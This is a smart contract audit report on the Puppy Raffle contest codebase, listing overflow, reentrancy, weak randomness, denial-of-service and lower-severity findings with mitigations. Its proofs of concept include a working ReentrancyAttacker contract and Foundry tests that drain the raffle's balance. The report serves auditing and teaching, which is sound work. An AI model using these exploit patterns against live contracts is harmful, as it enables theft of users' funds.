# Puppy Raffle Security Review

This security review provides a detailed compilation of all identified vulnerabilities and recommendations I submitted as part of the CodeHawks First Flight #2: Puppy Raffle in March 2024.

|   Severity   |   Issue   | 
|--------------|-----------|
|[H-1]| Integer overflow of `PuppyRaffle::totalFees` loses fees | 
|[H-2]| Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance | 
|[H-3]| Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy | 
|[M-1]| Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contest | 
|[M-2]| Looping through the `PuppyRaffle::players` array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack vector, incrementing gas costs for future entrants | 
|[L-1]| `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle | 
|[I-1]| Solidity version pragma should be specific, not wide | 
|[I-2]| Using an outdated version of Solidity is not recommended | 
|[I-3]| Missing checks for `address(0)` when assigning values to address state variables | 
|[I-4]| Use of "magic" numbers is discouraged | 
|[G-1]| Unchanged state variables should be declared constant or immutable | 
|[G-2]| Storage variables in a loop should be cached | 

## [H-1] Integer overflow of `PuppyRaffle::totalFees` loses fees

### Description

In Solidity versions prior to `0.8.0` integers were subject to integer overflows.

```solidity
uint64 myVar = type(uint64).max; // 18446744073709551615
myVar = myVar + 1; // myVar will be 0
```

### Impact

In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract. 

### Proof of Concept

1. We conclude a raffle of 4 players.
2. We then have 89 players enter a new raffle, and conclude the raffle.
3. `totalFees` will be :
```solidity
totalFees = totalFees + uint64(fee);
// aka
totalFees = 800000000000000000+ 1780000000000000000;
// and this will overflow!
totalFees = 153255926290448384;
```
4. You will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees`:
```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not the intended design of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to fulfill. 

```solidity
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

### Recommended Mitigation

There are a few possible mitigations.

1. Use a newer version of Solidity, and a `uint256` instead of a `uint64` for `PuppyRaffle::totalFees`.
2. You could also use the `SafeMath` library of OpenZeppelin for version 0.7.6 of Solidity. However, you would still have a hard time with the `uint64` type if too many fees are collected.
3. Remove the balance check from `PuppyRaffle::withdrawFees`:
```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

There are more attack vectors with that final require, so we recommend removing it regardless. 

## [H-2] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

### Description

The `PuppyRaffle::refund` function does not follow the CEI (Checks-Effects-Interactions) pattern and as a result, enables participants to drain the contract balance. 

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle:players` array.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle until the contract balance is drained.

### Impact

All fees paid by raffle entrants could be stolen by the malicious participant.

### Proof of Concept

1. User enters the raffle
2. Attacker sets up a contract with a `receive` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

Place the following into the `PuppyRaffleTest` contract: 

```solidity
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;

    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    console.log("starting attacker contract balance: ", startingAttackContractBalance);
    console.log("starting contract balance: ", startingContractBalance);
    
    console.log("ending attacker contract balance: ", address(attackerContract).balance);
    console.log("ending contract balance: ", address(puppyRaffle).balance);

}
```

Then, create an additional contract inside `PuppyRaffleTest.t.sol` as follows:

```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
    
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
}
```

### Recommended Mitigation

To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-   payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
-
    emit RaffleRefunded(playerAddress);
+   payable(msg.sender).sendValue(entranceFee);
}
```

## [H-3] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

### Description

Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable "random" number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Note:* This additionally means users could front-run this function and call `refund` if they see they are not the winner.

### Impact

Any user can influence the winner of the raffle, winning the money and selecting the rarest puppy, making the entire raffle worthless if it becomes a gas war as to who wins the raffles.  

### Proof of Concept

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao. 
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

### Recommended Mitigation

Consider using a cryptographically provable random number generator such as Chainlink VRF.

## [M-1] Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contest

### Description

The `PuppyRaffle::selectWinner` function is responsible for resettingthe lottery. However, if the winner is a smart contract wallet that rejects payments, the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

### Impact

The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult. 

Also, true winners would not get paid out and someone else could take their money!

### Proof of Concept

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends.
3. The `selectWinner` function wouldn't work, even though the lottery is over!

### Recommended Mitigation

There are a few options to mitigate this issue:

1. Do not allow smart contract wallet entrants (not recommended).
2. Create a mapping of addresses => payout amounts, so winners can pull their funds out themselves, putting the owness on the winner to claim their prize (recommended, "pull over push").

## [M-2] Looping through the `PuppyRaffle::players` array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack vector, incrementing gas costs for future entrants.

### Description

The `PuppyRaffle::enterRaffle` function loops through the `PuppyRaffle::players` array to check for duplicates. However, the longer the array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `PuppyRaffle::players` array, is an additional check the loop will have to make.

### Impact

The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue. An attacker might make the `PuppyRaffle::players` array so big that no one else enters, guaranteeing themselves the win.   

### Proof of Concept

If we have two sets of 100 players enter, the gas costs will be as such:
- First 100 players: ~ 6252039 gas
- Second 100 players: ~ 18068129 gas

This is roughly three times more expensive for the second 100 players.

```solidity
function testDenialOfService() public {
    vm.txGasPrice(1);

    uint256 numberOfPlayers = 100;
    address[] memory players = new address[](numberOfPlayers);
    for (uint256 i; i < numberOfPlayers; i++) {
        players[i] = address(i);
    }
    // see how much gas it costs 
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayers}(players);
    uint256 gasEnd = gasleft();
    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
    console.log("Gas cost of the first 100 players: ", gasUsedFirst);

    // now for the second 100 players
    address[] memory playersTwo = new address[](numberOfPlayers);
    for (uint256 i; i < numberOfPlayers; i++) {
        playersTwo[i] = address(i + numberOfPlayers);
    }
    // see how much gas it costs 
    uint256 gasStartSecond = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayers}(playersTwo);
    uint256 gasEndSecond = gasleft();
    uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
    console.log("Gas cost of the second 100 players: ", gasUsedSecond);

    assert(gasUsedFirst < gasUsedSecond);
}

```

### Recommended Mitigation

There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet address anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address. 
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.
3. Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet).

## [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle. 

### Description

If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the NatSpec, it will also return 0 if the player is not in the array.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    
    return 0;
}
```

### Impact

A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas. 

### Proof of Concept

1. User enters the raffle, they are the first entrant. 
2. `PuppyRaffle::getActivePlayerIndex` returns 0.
3. User thinks they have not entered correctly due to the function documentation.

### Recommended Mitigation

The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active. 

## [I-1] Solidity version pragma should be specific, not wide.

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`.

## [I-2] Using an outdated version of Solidity is not recommended. 

Please use a newer version like `0.8.18`.

## [I-3] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 122](src/PuppyRaffle.sol#L122)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 273](src/PuppyRaffle.sol#L273)

	```solidity
	        previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 306](src/PuppyRaffle.sol#L306)

	```solidity
	        feeAddress = newFeeAddress;
	```

## [I-4] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.

Examples: 

```solidity
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
```

Instead, you could use: 

```solidity
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PRECISION = 100;
```

## [G-1] Unchanged state variables should be declared constant or immutable. 

Reading from storage is much more expensive than reading from a constant or immutable variable.

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

## [G-2] Storage variables in a loop should be cached. 

Everytime you call `players.length` inside a loop you read from storage as opposed to reading from memory, which is more gas-efficient.